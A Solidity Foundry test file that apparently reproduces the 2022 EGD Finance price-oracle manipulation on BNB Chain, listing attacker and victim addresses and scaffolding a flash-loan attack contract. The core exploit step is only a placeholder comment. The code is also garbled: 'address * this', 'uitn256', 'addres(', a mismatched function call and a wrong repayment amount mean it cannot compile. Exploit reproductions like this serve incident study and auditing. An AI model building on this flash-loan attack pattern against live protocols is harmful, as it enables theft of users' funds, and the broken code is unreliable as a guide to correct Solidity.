// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test {
    Exploit exploit = new Exploit();

    constructor() {
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command."
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ---------------------------------------------------------------------- */
        cheat.roll(20245539); // Note: The attack transaction must be forked from the previous block. The victim contract state has not yet been modified at this point
        console.log("--------------------- Start Exploit ---------------------");
    }

    function testExploit() public {
        // To observe the changes in the balance, first print out them. Before attacking
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint(
            "[INFO] EDG/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
        );
        emit log_named_decimal_uint(
            "[INFO] Current earned reward (EDG token)", IEGD_Finance(EGD_Finance).calcaulateAll(address(exploit), 18)
        );

        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); // A Simulation of an EOA call attack
        console.log("--------------------- End Exploit ---------------------");

        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}

/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test {
    uint256 borrow1;

    function harvest() public {
        console.log("Flashlaon[1] : borrow 2,000 USDT from USDT/WBNB LPPoll reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address * this, "0000");
        console.log("Flashloan[1] : payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this)));
    }

    function pancakeCall(address sender, uitn256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] : Received");

        // Wekness exploit...

        // Exchange the stolen EGD Token for USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp
        );

        bool suc = IERC20(usdt).transfer(addres(USDT_WBNB_LPPool), 2010 * 10e18); // Attacker repays 2,000 uSDT + 0.5% service fee
        require(suc, "Transfer failed");
    }
}

/* ------------------------------ Interface ------------------------------ */
interface IEGD_Finance {
    function getEGDPrice() external view returns (uint256);

    function calcaulateAll(address addr) external view returns (uint256);
}
